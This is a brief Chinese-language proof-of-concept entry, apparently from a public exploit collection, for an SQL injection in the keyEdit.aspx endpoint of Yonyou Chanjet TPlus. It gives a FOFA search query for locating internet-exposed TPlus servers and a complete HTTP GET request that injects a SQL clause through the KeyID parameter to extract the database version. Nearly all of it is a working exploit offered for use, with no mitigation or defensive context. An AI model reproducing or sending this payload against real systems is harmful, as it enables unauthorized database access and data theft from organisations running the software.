## 用友畅捷通TPlus-keyEdit.aspx接口存在SQL注入漏洞

## fofa
```
app="畅捷通-TPlus"
```


## poc
```
GET /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&preload=1 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xxx.xxx.xxx
Accept-Charset: utf-8
```

![2099c8aae5cff9620805364eacbd9ea8](https://github.com/wy876/POC/assets/139549762/b1cb6ae4-3588-4de9-a97d-e57bc6607f7c)
